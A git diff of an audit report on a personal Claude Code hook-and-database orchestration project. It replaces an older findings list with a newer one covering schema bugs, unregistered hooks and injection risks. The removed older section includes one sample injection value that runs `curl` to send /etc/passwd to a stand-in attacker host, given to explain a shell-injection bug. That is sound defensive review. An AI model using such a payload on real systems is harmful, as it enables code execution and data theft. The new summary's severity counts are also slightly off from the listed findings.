@@ -1,349 +1,356 @@
-# AUDIT.md — Claude Code Orchestration Project
+# Audit Report — ~/.claude Orchestration Project
 
-**Audited by:** Claude Sonnet 4.6
-**Date:** 2026-03-20
-**Scope:** Full project at `/Users/kelsiandrews/.claude`
-
----
+**Date:** 2026-03-21
+**Engine:** Claude-only (Gemini timed out on full project scan)
+**Scope:** Full project — hooks/, scripts/, skills/, mcp-servers/, decision_memory/, plugins/, tracking/
 
 ## Executive Summary
 
-This is a well-structured orchestration infrastructure for Claude Code. The core pipeline — session lifecycle hooks, correction detection, signal processing, decision memory, and the Gemini MCP server — is thoughtfully designed with good separation of concerns, meaningful fallback paths (e.g., Ollama unavailable → degrade gracefully), and consistent WAL mode + busy_timeout patterns across most SQLite writes.
+Full-project audit of the ~/.claude orchestration system covering hooks (session lifecycle), Python libraries (signal processing, memory writes, embedding, stop processing), scripts (build verification, event emission), MCP servers (Gemini, decisions), decision memory system, and plugin infrastructure. Claude-only pass (Gemini audit timed out at 120s on full project). Found 30 issues: 0 critical, 2 high, 11 medium, 17 low. The two high-severity findings are structurally significant: (1) Stage 7 pattern mining in stop_processor.py is permanently non-functional due to a schema mismatch (`what_failed` column missing from `merge_outcomes`), and (2) decision-checking hooks exist on disk but are never registered in settings.json, meaning pre/post-agent decision enforcement never fires. Score: 0/100 (weighted scoring penalizes heavily across 4 sections).
 
-**Critical issues (High):** 3 — two shell injection vectors, one missing DB connection timeout
-**Important issues (Medium):** 8 — stale documentation in injected context, duplicate background process spawn, `write_targets` vs `write_files` column name mismatch, promotion threshold inconsistency, private method leakage, `skipDangerousModePermissionPrompt: true` with no audit note
-**Minor issues (Low):** 6 — dead unreachable code, embedding call cap shared across detection/grouping, missing atexit on session-start freshness processes, `prev_assistant_had_tool_use` unused variable, `TRACKER_DIR` unused constant, `_check_promoted` function dead code
+## Score Breakdown
 
-Overall score: **6.5 / 10** — solid design, undermined by a small cluster of real bugs and a few security gaps that could cause silent data corruption or execution vulnerabilities.
+| Section | Findings | Weight | Weighted Deduction | Raw Deduction |
+|---|---|---|---|---|
+| Security | 7 | 4x | 40 | 10 |
+| Bugs | 7 | 3x | 39 | 13 |
+| Completeness | 4 | 2x | 14 | 7 |
+| Quality | 12 | 1x | 14 | 14 |
+| **Total** | **30** | | **107** | **44** |
 
----
-
-## Code Quality and Smells
-
-### CQ-1 [Medium] — Stale `corrections.md` reference in Tier 2 context injection
-
-**File:** `/Users/kelsiandrews/.claude/hooks/inject-tier2-context.sh`, line 109
-
-The `infra_corrections` fragment injected on every prompt containing "correction" or "distill" tells Claude:
-
-```
-"Corrections: logged to corrections.md, tracked in correction_groups table..."
-```
-
-`corrections.md` is a dead surface (replaced by `log-correction.sh → DB` per decision-79). Claude sessions receiving this hint may attempt to write to a file that no longer exists or is no longer the source of truth, creating confusion. The hint should describe only the current pipeline.
-
-**Fix:**
-```
-"Corrections: logged directly to correction_groups table in epics.db via log-correction.sh. Auto-detected via signal_processor.py at session end. Preferences rendered to .claude/rendered-prefs.md at session start. No corrections.md."
-```
+**Score: 0/100** (floored from -7)
 
 ---
 
-### CQ-2 [Medium] — `write_targets` column queried; actual column is `write_files`
+## Security
 
-**File:** `/Users/kelsiandrews/.claude/hooks/guard-direct-edit.sh`, lines 7, 97, 113, 125
+### F-001 — `os.system()` with f-string interpolation
+**MEDIUM** | `tracking/patch-durations.py:99` | `[claude]`
 
-The comment block and the embedded Python query reference `write_targets`:
+`os.system()` with f-string path interpolation. Paths containing shell metacharacters could cause unexpected behavior. Same pattern in `tracking/backfill.py:212`.
+
 ```python
-query = f'SELECT write_targets FROM stories WHERE state IN ({placeholders}) AND archived=0'
+os.system(f'python3 "{SCRIPT_DIR}/generate-charts.py" "{tracking_dir}" "{charts_html}" 2>/dev/null')
 ```
 
-The actual column in `epics.db` is `write_files` (confirmed via `PRAGMA table_info(stories)`). SQLite returns an `OperationalError: no such column: write_targets`, which is caught by the `except Exception: print('EPICS_UNAVAILABLE')` handler. This causes the guard to fall back to block-all mode on every call, correctly blocking but never reaching the nuanced scope-check path. The feature silently doesn't work.
-
-**Fix:** Change the query to `SELECT write_files FROM stories ...` and update the comment on lines 7 and 97.
+> Given a tracking directory path containing shell metacharacters, When the script runs, Then it should use `subprocess.run()` with a list of arguments instead of `os.system()`.
 
 ---
 
-### CQ-3 [Low] — `prev_assistant_had_tool_use` set but never read
+### F-002 — Dead column reference in decision check SQL
+**MEDIUM** | `hooks/check-decisions-post-agent.sh:119-128` | `[claude]`
 
-**File:** `/Users/kelsiandrews/.claude/hooks/lib/signal_processor.py`, lines 123, 128, 135, 138, 141, 164
+SQL query references `positive_framing` column that doesn't exist in the decisions table. The `COALESCE(d.positive_framing, d.content)` fails with `OperationalError`, caught by bare `except Exception` on line 133, causing the entire post-agent decision check to silently fail.
 
-The variable `prev_assistant_had_tool_use` is set at multiple points in `extract_corrections()` but is never read — the logic intended to use it (e.g., boosting weight when a correction immediately follows a tool use) was removed but the variable wasn't cleaned up. Dead noise.
+```sql
+SELECT DISTINCT d.id, COALESCE(d.positive_framing, d.content)
+```
 
-**Fix:** Remove all assignments to `prev_assistant_had_tool_use` in that function.
-
----
-
-### CQ-4 [Low] — `_check_promoted()` is defined but never called
-
-**File:** `/Users/kelsiandrews/.claude/hooks/lib/signal_processor.py`, lines 340–369
-
-The function `_check_promoted(theme_text, project_root)` is fully implemented but has zero call sites anywhere in the codebase. It appears to have been replaced by the inline embedding check inside `process_session_corrections`. Dead code that creates confusion about intended design.
-
-**Fix:** Delete the function.
+> Given a coder agent that modifies files with decision constraints, When the post-agent hook runs, Then the SQL query should use only columns that exist in the schema (`d.content` instead of the COALESCE).
 
 ---
 
-### CQ-5 [Medium] — Duplicate `decision-freshness.py` background spawn in `load-session-context.sh`
+### F-003 — Unescaped filename in JSON payload
+**LOW** | `hooks/guard-protected-files.sh:60` | `[claude]`
 
-**File:** `/Users/kelsiandrews/.claude/hooks/load-session-context.sh`, lines 314 and 333
-
-The same `nohup python3 decision-freshness.py` command is spawned twice in one run of `load-session-context.sh` — once at line 314 (log filename uses `${CLAUDE_SESSION_ID:-$$}`) and once at line 333 (log filename uses `${SESSION_ID}`). Both are inside the same `if [[ "$PWD" == "$HOME/.claude" ]]` block. Two concurrent processes will both write to `decision_freshness` via `INSERT OR REPLACE`, causing redundant git subprocess calls on every scoped file and unnecessary DB write contention.
-
-**Fix:** Remove the spawn at line 314. The one at line 333 uses the sanitized `SESSION_ID` and has the correct log filename.
-
----
-
-### CQ-6 [Low] — `TRACKER_DIR` constant defined and never used
-
-**File:** `/Users/kelsiandrews/.claude/hooks/cost-alert.sh`, line 12
+`PROTECTED_NAME` interpolated directly into JSON without escaping. A filename containing double-quotes would produce malformed JSON in the event log.
 
 ```bash
-TRACKER_DIR="/opt/homebrew/opt/claude-code-tracker/libexec/src"
+"{\"protected_file\":\"$PROTECTED_NAME\",\"result\":\"blocked\"}"
 ```
 
-This variable is never read. The cost value is found via `find` using a different path. Dead code that implies a path dependency that isn't actually used.
-
-**Fix:** Delete line 12.
+> Given a protected filename containing JSON-special characters, When the hook emits an event, Then the filename should be properly JSON-escaped.
 
 ---
 
-### CQ-7 [Medium] — `store._get_connection()` called directly from outside `DecisionStore`
+### F-004 — Unescaped file path in JSON payload
+**LOW** | `hooks/guard-direct-edit.sh:149,156,164` | `[claude]`
 
-**File:** `/Users/kelsiandrews/.claude/mcp-servers/decisions/server.py`, lines 174, 214, 250, 322, 384
+Same pattern as F-003: `$FILE_PATH` interpolated directly into JSON string literals for `emit-event.sh`.
 
-`server.py` directly calls `store._get_connection()` in multiple MCP tool implementations. `_get_connection` is a private method of `DecisionStore`. This creates a coupling that will silently bypass future changes to connection setup (e.g., if WAL mode or sqlite-vec loading changes in `_get_connection`).
-
-`record_project_decision` additionally manually commits and closes a connection obtained via `store._get_connection()` without going through `DecisionStore`'s own `record()` method, which means the FTS index, dump, and relationship tracking only partially run through the intended pipeline.
-
-**Fix:** Add a `get_connection()` public method to `DecisionStore`, or better: add targeted methods like `update_decision_status(id, status, superseded_by)` and `add_relationship(id, entry)` that encapsulate the write operations.
+> Given a file path containing JSON-special characters, When the guard emits an event, Then the path should be JSON-escaped.
 
 ---
 
-### CQ-8 [Medium] — Promotion threshold hardcoded to 3 in `log-correction.sh`, diverging from `PROMOTION_THRESHOLD` constant
+### F-005 — MD5 used for content hashing
+**LOW** | `hooks/lib/om_write.py:74-75` | `[claude]`
 
-**File:** `/Users/kelsiandrews/.claude/scripts/log-correction.sh`, line 77
+MD5 used for dedup hashing (fallback when Ollama unavailable). Not cryptographic use, but collision probability is unnecessarily high.
 
 ```python
-new_status = 'pending_promotion' if new_count >= 3 else old_status
+return hashlib.md5(content.lower().strip().encode()).hexdigest()[:16]
 ```
 
-`signal_processor.py` defines `PROMOTION_THRESHOLD = 3` (line 258). `log-correction.sh` doesn't import this — it has a hardcoded `3`. If `PROMOTION_THRESHOLD` is ever changed in the Python module, `log-correction.sh` will silently use a different threshold, breaking parity between auto-detected and manual corrections.
-
-**Fix:** Add a comment in both files documenting the coupling (`# Must match PROMOTION_THRESHOLD in signal_processor.py`), or factor out a standalone `upsert-correction.py` helper that both paths invoke.
+> Given two different memory entries, When the fallback simhash path is used, Then the hash function should use SHA-256 (truncated) instead of MD5.
 
 ---
 
-### CQ-9 [Low] — Embedding call cap `MAX_EMBEDDING_CALLS_PER_SESSION = 5` misleadingly named
+### F-006 — Unsanitized FTS5 query terms
+**MEDIUM** | `hooks/check-decisions-pre-agent.sh:96-114` | `[claude]`
 
-**File:** `/Users/kelsiandrews/.claude/hooks/lib/signal_processor.py`, lines 124, 144, 277, 491
+Words from agent prompts passed directly into FTS5 MATCH clause without sanitizing FTS5 operators (AND, OR, NOT, NEAR, column filters). Could alter query semantics or cause crashes.
 
-`extract_corrections()` uses an `embedding_calls` counter capped at 5, and `process_session_corrections()` uses a separate `grouping_embedding_calls` also capped at 5. These are independent local counters, so a session can use up to 10 Ollama calls (5 for detection + 5 for grouping), plus 10 calls for prototype loading. The effective maximum is ~20 calls, not 5. The constant name and its docstring are misleading.
+```python
+query = " OR ".join(words)
+conn.execute("SELECT rowid, rank FROM decisions_fts WHERE decisions_fts MATCH ? LIMIT 5", (query,))
+```
 
-**Fix:** Rename to `MAX_EMBEDDING_CALLS_PER_PHASE` and add a comment: `# Applied independently in extraction and grouping phases`.
+> Given an agent prompt containing FTS5 special characters, When the fallback FTS5 query runs, Then query terms should be sanitized to strip FTS5 operators.
 
 ---
 
-## Identified Bugs and Fixes
+### F-007 — SQL string interpolation for date value
+**LOW** | `hooks/lib/session_agenda.py:79` | `[claude]`
 
-### BUG-1 [High] — Shell injection via `$FILE_PATH` interpolated into Python heredoc
+`cutoff_iso` date value string-interpolated into SQL instead of parameterized. Currently safe (derived from `datetime.fromtimestamp()`) but violates parameterized query pattern used elsewhere.
 
-**File:** `/Users/kelsiandrews/.claude/hooks/track-skill-changes.sh`, line 41
+```python
+f"AND completed_at >= '{cutoff_iso}' ORDER BY completed_at DESC LIMIT 5;"
+```
+
+> Given the completed stories query, When building SQL, Then `cutoff_iso` should be a parameterized query argument (`?`).
+
+---
+
+## Bugs
+
+### F-008 — `what_failed` column missing from merge_outcomes schema
+**HIGH** | `hooks/lib/stop_processor.py:457-458` | `[claude]`
+
+`stage_pattern_mining()` queries `what_failed` from `merge_outcomes`, but this column doesn't exist in the schema defined in `scripts/init-run-db.py:70-83`. Always raises `OperationalError`, caught on line 460, causing Stage 7 to silently skip. **Pattern mining has never worked.**
+
+```python
+"SELECT story_id, domain_tags, what_failed FROM merge_outcomes "
+```
+
+> Given merge_outcomes records with failure information, When stage_pattern_mining runs, Then either the `what_failed` column should be added to the schema, or the query should use existing columns (`error_classification` or `test_output` from `merge_results`).
+
+---
+
+### F-009 — Redundant nested DB file check
+**MEDIUM** | `hooks/load-session-context.sh:117-126` | `[claude]`
+
+Nested `if [[ -f "$DB_FILE" ]]` is inside an identical outer check, making the inner check always true. Confusing structure.
+
+> Given epics.db exists, When the session start hook runs, Then the redundant inner check should be removed.
+
+---
+
+### F-010 — Dead variable `prev_assistant_had_tool_use`
+**MEDIUM** | `hooks/lib/signal_processor.py:125-129` | `[claude]`
+
+Variable assigned but never read anywhere in the function or module. Remnant of older implementation.
+
+```python
+prev_assistant_had_tool_use = turn.get("has_tool_use", False)
+```
+
+> Given the extract_corrections function, When processing turns, Then dead variable `prev_assistant_had_tool_use` should be removed.
+
+---
+
+### F-011 — Post-agent decision check only covers last commit
+**MEDIUM** | `hooks/check-decisions-post-agent.sh:73-77` | `[claude]`
+
+`git diff --name-only HEAD~1 HEAD` only checks the last commit. Multi-commit agents will have earlier files unchecked. The fallback (`origin/dev...HEAD`) only triggers if line 73 returns empty.
 
 ```bash
-with open('$FILE_PATH') as f:
+CHANGED_FILES=$(git -C "$WORKTREE_PATH" diff --name-only HEAD~1 HEAD 2>/dev/null)
 ```
 
-`$FILE_PATH` is expanded by bash before the heredoc content is fed to Python. A file path containing a single quote (e.g., `don't.jsx`) breaks the Python syntax. A path containing `') ; import os; os.system("curl attacker.com -d $(cat /etc/passwd)")  #` would execute arbitrary code with the hook process's permissions.
+> Given a coder agent that made 3 commits, When the post-agent decision check runs, Then it should compare against the base branch to catch all changed files.
 
-While `FILE_PATH` originates from Claude's tool input JSON (parsed by `parse_hook_input.py`), Claude may legitimately be asked to edit files with unusual names, and this is still an injection vector.
+---
 
-**Fix:** Pass the path as a command-line argument rather than string interpolation — the same pattern already used correctly in `guard-direct-edit.sh` and `inject-tier2-context.sh`:
+### F-012 — SIGTERM handler doesn't explicitly clean up DB
+**LOW** | `hooks/lib/stop_processor.py:548` | `[claude]`
+
+SIGTERM handler calls `sys.exit(0)` which triggers atexit, but doesn't explicitly rollback any open DB transaction before releasing the lock.
+
+```python
+signal.signal(signal.SIGTERM, lambda *_: sys.exit(0))
+```
+
+> Given a stop_processor with an open DB connection, When SIGTERM is received, Then the handler should ensure connections are properly closed/rolled-back.
+
+---
+
+### F-013 — TOCTOU race in DB replacement
+**LOW** | `decision_memory/store.py:106-110` | `[claude]`
+
+After `os.replace()` of the DB file during `sync_from_dump()`, WAL/SHM files are explicitly deleted. But another process could open the old DB between `conn.close()` and `os.replace()`. Low probability in single-user context.
+
+> Given a concurrent process reading decisions.db, When sync_from_dump replaces the DB file, Then the replacement should be atomic and account for concurrent readers.
+
+---
+
+### F-014 — Correction count uses unique dates instead of total occurrences
+**MEDIUM** | `hooks/lib/session_db_migrate.py:87-106` | `[claude]`
+
+`_fix_correction_counts()` uses `len(set(dates))` which deduplicates by day. A correction occurring twice on the same day in different sessions gets counted as 1.
+
+```python
+actual = len(set(dates))
+```
+
+> Given a correction that occurred twice on the same day in different sessions, When the migration fix runs, Then the count should reflect total occurrences (`len(dates)`) not unique dates (`len(set(dates))`).
+
+---
+
+## Completeness
+
+### F-015 — Decision-checking hooks never registered in settings.json
+**HIGH** | `settings.json` / `hooks/check-decisions-*.sh` | `[claude]`
+
+`check-decisions-pre-agent.sh` and `check-decisions-post-agent.sh` exist on disk with full implementations but are NOT registered in `settings.json` under any PreToolUse/PostToolUse matcher. **Decision enforcement never fires.**
+
+> Given a coder agent launch, When PreToolUse fires for the Agent tool, Then `check-decisions-pre-agent.sh` should be registered in `settings.json` with appropriate matchers.
+
+---
+
+### F-016 — Stage 7 pattern mining permanently non-functional
+**MEDIUM** | `hooks/lib/stop_processor.py:457` | `[claude]`
+
+Related to F-008. ~80 lines of clustering logic that has never successfully executed due to schema mismatch. The `OperationalError` is silently caught.
+
+> Given merge outcomes with failure data, When the stop processor runs Stage 7, Then it should successfully query and cluster failure patterns.
+
+---
+
+### F-017 — inject-tier2-context.sh not marked async
+**LOW** | `settings.json:170-180` | `[claude]`
+
+Script header comment says "Hook is async: true" but `settings.json` registration omits the flag. Hook blocks prompt processing synchronously.
+
+> Given a user prompt submission, When the tier-2 context injection hook runs, Then it should be marked `"async": true` in settings.json, OR the comment should be updated.
+
+---
+
+### F-018 — Dead reference to tool-learnings.md
+**LOW** | `tracking/stop-hook.sh:73-81` | `[claude]`
+
+References `$HOME/.claude/tool-learnings.md` which decision-6 explicitly marks as a dead surface.
+
+> Given decision-6 marks tool-learnings.md as dead, When the stop hook runs, Then the reference should be removed.
+
+---
+
+## Quality
+
+### F-019 — process_session_corrections() does too many things
+**MEDIUM** | `hooks/lib/signal_processor.py:398-518` | `[claude]`
+
+120-line function handling 6 responsibilities: extraction, dedup, semantic matching, text matching, count/status management, and DB writes.
+
+> Given the correction processing pipeline, When reviewing the code, Then the function should be decomposed into focused sub-functions.
+
+---
+
+### F-020 — Duplicate schema migration in stop_processor
+**MEDIUM** | `hooks/lib/stop_processor.py:233-295` | `[claude]`
+
+63-line inline schema migration duplicates what `session_db_migrate.py` already handles at session start.
+
+> Given that session_db_migrate.py runs at session start, When stage_hook_generation() runs, Then it should not duplicate migration logic.
+
+---
+
+### F-021 — Module-level mutable state via globals
+**LOW** | `hooks/lib/om_write.py:38-39` | `[claude]`
+
+`_ollama_fallback_warned` and `_migration_done` tracked as module globals via `global` keyword.
+
+> Given the om_write module, When used in a long-running process, Then initialization tracking should use a class or context manager pattern.
+
+---
+
+### F-022 — Repetitive JSON parsing across hooks
+**LOW** | Multiple hook scripts | `[claude]`
+
+Many hooks inline `python3 -c "import json,sys; ..."` for field extraction instead of using the existing `parse_hook_input.py` utility.
+
+> Given parse_hook_input.py exists, When hooks need JSON field extraction, Then they should use the shared parser consistently.
+
+---
+
+### F-023 — Test code embedded in production module
+**LOW** | `hooks/lib/hook_generator.py:356-507` | `[claude]`
+
+150-line `_run_tests()` function with 16 test cases embedded in the production module instead of in `hooks/lib/tests/`.
+
+> Given the tests directory exists, When hook_generator tests are needed, Then they should live in `hooks/lib/tests/test_hook_generator.py`.
+
+---
+
+### F-024 — Build exit code masked by pipe to tail
+**LOW** | `scripts/build-verify.sh:137` | `[claude]`
+
+`bash -c "$BUILD_CMD" 2>&1 | tail -30` — `$?` captures `tail`'s exit code, not the build's.
+
 ```bash
-python3 - "$FILE_PATH" <<'PYEOF'
-import sys
-file_path = sys.argv[1]
-with open(file_path) as f:
-    ...
-PYEOF
+BUILD_OUTPUT=$(bash -c "$BUILD_CMD" 2>&1 | tail -30)
 ```
+
+> Given a build command that fails, When output is captured, Then `PIPESTATUS[0]` or `set -o pipefail` should capture the actual build exit code.
 
 ---
 
-### BUG-2 [High] — Shell injection via `$TOKENS_FILE`, `$COST`, `$THRESHOLD` interpolated into Python `-c` strings
+### F-025 — Magic similarity threshold defined independently in two modules
+**LOW** | `hooks/lib/signal_processor.py:250` + `hooks/lib/om_write.py` | `[claude]`
 
-**File:** `/Users/kelsiandrews/.claude/hooks/cost-alert.sh`, lines 18, 43, 56–57
+`SIMILARITY_THRESHOLD = 0.85` in signal_processor.py and `DEDUP_THRESHOLD = 0.85` in om_write.py — same value, no shared constant.
 
-```bash
-COST=$(python3 -c "
-    with open('$TOKENS_FILE') as f:
-```
-
-`$TOKENS_FILE` comes from `find` across user-writable directories including `/tmp`. A file named `/tmp/tokens-2026-03-20.json` can be created by any process. A filename containing `') ; import os; os.system('...')#` would execute on the next Stop hook invocation.
-
-`$COST` and `$THRESHOLD` are also interpolated directly into Python expressions (`float('$COST')`). If either contains a quote or special characters from a malformed tracker file, this is an additional injection path.
-
-**Fix for `TOKENS_FILE`:** Use heredoc + `sys.argv`:
-```bash
-COST=$(python3 - "$TOKENS_FILE" <<'PYEOF'
-import json, sys
-try:
-    with open(sys.argv[1]) as f:
-        d = json.load(f)
-    cost = d.get('estimated_cost_usd') or d.get('today', {}).get('estimated_cost_usd') or 0
-    print(f'{float(cost):.2f}')
-except Exception:
-    print('0.00')
-PYEOF
-)
-```
-
-**Fix for `$COST`/`$THRESHOLD`:** Pass as `sys.argv` arguments to the comparison script.
+> Given the embedding similarity threshold, When used for dedup across modules, Then it should be imported from a shared constant.
 
 ---
 
-### BUG-3 [High] — `main_logic()` opens SQLite connection without `timeout`
+### F-026 — No overall timeout on stop_processor
+**MEDIUM** | `hooks/lib/stop_processor.py:526-600` | `[claude]`
 
-**File:** `/Users/kelsiandrews/.claude/hooks/lib/signal_processor.py`, line 808
+7 sequential stages with no total execution time bound. Slow Ollama or locked DB could run for minutes while holding the advisory lock.
 
-```python
-conn = sqlite3.connect(db_path)
-```
-
-Every other DB connection in this file and across the project uses `timeout=5` or `timeout=10`. This connection has no timeout — if `epics.db` is locked (e.g., by auto-distillation running concurrently in `stop_processor.py`), `main_logic` will block the background process indefinitely. Since this runs in a nohup background subprocess, a hung process would hold the fcntl lock and prevent future stop hook runs for the same session.
-
-**Fix:**
-```python
-conn = sqlite3.connect(db_path, timeout=10)
-conn.execute("PRAGMA journal_mode=WAL")
-conn.execute("PRAGMA busy_timeout=5000")
-```
+> Given a stop_processor encountering slow operations, When total execution exceeds 120 seconds, Then it should self-terminate and release its lock.
 
 ---
 
-### BUG-4 [Medium] — Scope matching in `inject-project-decisions.sh` produces false positives
+### F-027 — N+1 query pattern in decision search
+**LOW** | `decision_memory/search.py:196-226` | `[claude]`
 
-**File:** `/Users/kelsiandrews/.claude/hooks/inject-project-decisions.sh`, lines 73–81
+`_fetch_decision()` called once per result row (up to 30 calls per hybrid search). Could batch-fetch with `WHERE id IN (...)`.
 
-```python
-OR ? LIKE '%' || ds.scope_value || '%'
-OR ds.scope_value LIKE '%' || ? || '%'
-```
-
-The first condition asks "does the file path contain the scope value as a substring?" — a scope of `py` would match `apply.tsx` or any path containing the letters `py`. The second inverts this: "does the scope value contain the filename as a substring?" — a scope of `hooks/lib/signal_processor.py` would match `signal_processor.py` alone. Both are overly broad. Active decisions meant for `hooks/lib/` would inject into every `.py` file anywhere in the project.
-
-**Fix:** Use path-prefix matching:
-```python
-OR ? LIKE ds.scope_value || '%'
-OR ? LIKE '%/' || ds.scope_value
-```
-Or, after the SQL query, filter with Python's `fnmatch.fnmatch(file_path, scope_value)` — as `server.py`'s `query_project_decisions` already does correctly.
+> Given a hybrid search returning 15+ results, When fetching decision details, Then the implementation should batch-fetch to reduce queries from O(N) to O(1).
 
 ---
 
-### BUG-5 [Medium] — `dedup_check` in `om_write.py` floods stderr when Ollama is down
+### F-028 — No None guard on correction text
+**LOW** | `hooks/lib/session_render_prefs.py:40-43` | `[claude]`
 
-**File:** `/Users/kelsiandrews/.claude/hooks/lib/om_write.py`, line 76
+`row[0].strip()` will crash with `AttributeError` if `text` column is NULL.
 
 ```python
-print("om_write: ollama_fallback — embedding unavailable for dedup", file=sys.stderr)
+text = row[0].strip()
 ```
 
-This fires on every single `dedup_check()` call when Ollama is unavailable. `om_write()` is called by session summary, auto-distillation, and hook generation — potentially dozens of times per stop hook run. Each call emits a separate warning to stderr, creating noise that obscures actual errors in stop-processor logs.
-
-**Fix:** Add a module-level flag:
-```python
-_ollama_fallback_warned = False
-
-def dedup_check(content, primary_tag):
-    global _ollama_fallback_warned
-    embedding = get_embedding(content)
-    if embedding is None:
-        if not _ollama_fallback_warned:
-            print("om_write: ollama_fallback — embedding unavailable for dedup", file=sys.stderr)
-            _ollama_fallback_warned = True
-        # fall through to simhash...
-```
+> Given a correction_groups row with NULL text, When rendering preferences, Then the code should handle None gracefully.
 
 ---
 
-### BUG-6 [Medium] — `stage_hook_generation` schema migration check is fragile; `executescript` has implicit commit side effects
+### F-029 — Repeated capture pattern in build-verify.sh
+**LOW** | `scripts/build-verify.sh:137,164,192` | `[claude]`
 
-**File:** `/Users/kelsiandrews/.claude/hooks/lib/stop_processor.py`, lines 240–263
+Identical `set +e; RESULT=$(command); EXIT=$?; set -e` pattern repeated 3 times.
 
-The migration guard checks for the literal string `'dismissed'` in the DDL text:
-```python
-if schema_sql and "'dismissed'" not in schema_sql[0]:
-```
-
-This breaks if the DDL string is reformatted (e.g., double-quoted instead of single-quoted). If the guard fails, `executescript` runs the full rename-and-recreate migration on an already-migrated schema, causing `INSERT INTO correction_groups SELECT * FROM correction_groups_old` to fail with "no such table: correction_groups_old" — but `executescript` will have already renamed the live table and committed, leaving the DB in a broken state.
-
-**Fix:** Use the PRAGMA-based column check already established elsewhere in the codebase:
-```python
-cols = conn.execute("PRAGMA table_info(correction_groups)").fetchall()
-col_names = {c[1] for c in cols}
-if 'status' not in col_names or 'dismissed' not in (conn.execute(
-    "SELECT sql FROM sqlite_master WHERE name='correction_groups'"
-).fetchone() or ('',))[0]:
-    # run migration
-```
-Or, simpler: check `col_names` for the absence of a column added in that migration pass.
+> Given the repeated capture pattern, When build/lint/test commands are run, Then a shared helper function should encapsulate it.
 
 ---
 
-### BUG-7 [Medium] — `skipDangerousModePermissionPrompt: true` is set with no recorded rationale
+### F-030 — f-string brace escaping in generated bash scripts
+**MEDIUM** | `hooks/lib/hook_generator.py:129-148` | `[claude]`
 
-**File:** `/Users/kelsiandrews/.claude/settings.json`, line 191
+Bash scripts generated as Python f-strings with `{{}}` brace escaping for embedded Python dicts. Extremely hard to read/maintain.
 
-```json
-"skipDangerousModePermissionPrompt": true
-```
-
-This bypasses Claude's interactive confirmation for potentially dangerous operations globally. The hook infrastructure provides some compensating controls (`guard-direct-edit`, `block-env-read`, `guard-protected-files`), but all three are per-tool and do not gate raw Bash execution. `warn-sync-heavy-bash` is advisory-only and async. A prompt that convinces Claude to run an arbitrary shell command would not be stopped by any hook.
-
-This is not necessarily wrong for this setup but has no recorded decision. If removed for any reason (e.g., new machine setup), the behavior would silently change.
-
-**Recommendation:** Record a decision (`pm_add_decision`) explaining the rationale. If the setting was added for convenience rather than deliberate policy, consider reverting.
+> Given hook template generation, When generating bash scripts, Then use `string.Template` or a dedicated templating approach instead of f-strings.
 
 ---
 
-## Recommendations for Improvements
-
-### REC-1 — Centralize all SQLite connection creation
-
-`signal_processor.py`, `om_write.py`, `stop_processor.py`, `decision-freshness.py`, and `server.py` each open SQLite connections with slightly varying parameters. A shared `_connect(path, timeout=10)` helper in `hooks/lib/` would enforce consistent WAL + busy_timeout across all call sites and eliminate BUG-3.
-
-### REC-2 — Project-wide lint for `python3 -c "...with open('$VAR')..."` pattern
-
-Add a grep check in `scripts/validation-runner.sh` that fails if any hook script contains `'$` inside a `python3 -c "..."` invocation. This would catch BUG-1 and BUG-2 automatically.
-
-### REC-3 — Add `guard-direct-edit.sh` column name test to validation-runner.sh
-
-The `write_targets` vs `write_files` bug (CQ-2) could be caught by a simple test that runs the embedded Python block against a test DB and asserts the result is not `EPICS_UNAVAILABLE`. Add this to `scripts/validation-runner.sh`.
-
-### REC-4 — `record_project_decision`: encapsulate DB writes inside `DecisionStore`
-
-The current pattern in `server.py` (open a second connection via `store._get_connection()`, manually write, manually commit) bypasses `DecisionStore`'s own write path. Extract `update_decision_status`, `add_related_decision`, and `supersede` as methods on `DecisionStore` to restore single-path integrity.
-
-### REC-5 — `inject-project-decisions.sh`: use fnmatch instead of LIKE substring
-
-The scope matching in BUG-4 produces false positive injections on short scope values. Switching to Python `fnmatch` (as `server.py` does) would eliminate noisy context injections that erode prompt quality.
-
-### REC-6 — Stage 4 distillation: commit DB promotions before OM writes
-
-`stage_auto_distillation` currently interleaves DB commits and `om_write` calls per-row. If `om_write` raises mid-loop, the DB commit has happened but OM doesn't have the entry. Record all DB promotions first, commit once, then do OM writes so the DB is the authoritative source and OM failures are safe to retry.
-
-### REC-7 — `_default_provider` global in `decision_memory/embeddings.py` is not thread-safe
-
-`get_default_provider()` uses a module-level global without locking. FastMCP may invoke concurrent tool calls. Add a `threading.Lock` around the initialization check.
-
-### REC-8 — Tag matching in `om_write.py` uses `LIKE '%tag%'` which matches substrings
-
-`tags LIKE '%tool-learning%'` also matches any tag containing `tool-learning` as a substring. The current `ALLOWED_TAGS` set has no overlapping substrings, so this is low-risk today. Consider storing tags in a normalized join table or using `json_each` for correctness.
-
----
-
-## Overall Score
-
-**6.5 / 10**
-
-**Rationale:** The architecture is solid — tiered context injection, WAL-mode SQLite everywhere, graceful degradation when Ollama is absent, the policy-mechanism split for scripts vs skills, and the three-layer decision injection are all good engineering decisions. The 16-test suite in `hook_generator.py` and the `decision_memory/test_e2e.py` tests show the right instinct.
-
-What pulls the score down: two exploitable shell injection vectors in stop hook scripts (BUG-1, BUG-2), one missing DB timeout that can cause indefinite background process hangs (BUG-3), a silent feature regression where the scope-checking path in `guard-direct-edit.sh` has never worked due to a column name typo (CQ-2), a stale documentation fragment actively injected into Claude's context each session (CQ-1), and `skipDangerousModePermissionPrompt: true` with no recorded justification (BUG-7). None of these require architectural changes — every one is fixable in under 30 minutes.
-
-| Category | Count | Critical |
-|---|---|---|
-| Security (shell injection, permissions) | 3 | 2 High, 1 Medium |
-| Correctness / Bugs | 4 | 1 High, 3 Medium |
-| Code quality / smells | 9 | 0 High, 4 Medium, 5 Low |
-| Recommendations | 8 | — |
+*Report generated 2026-03-21. Engine: Claude-only (Gemini timed out). No requirements document — completeness section uses structural analysis only.*
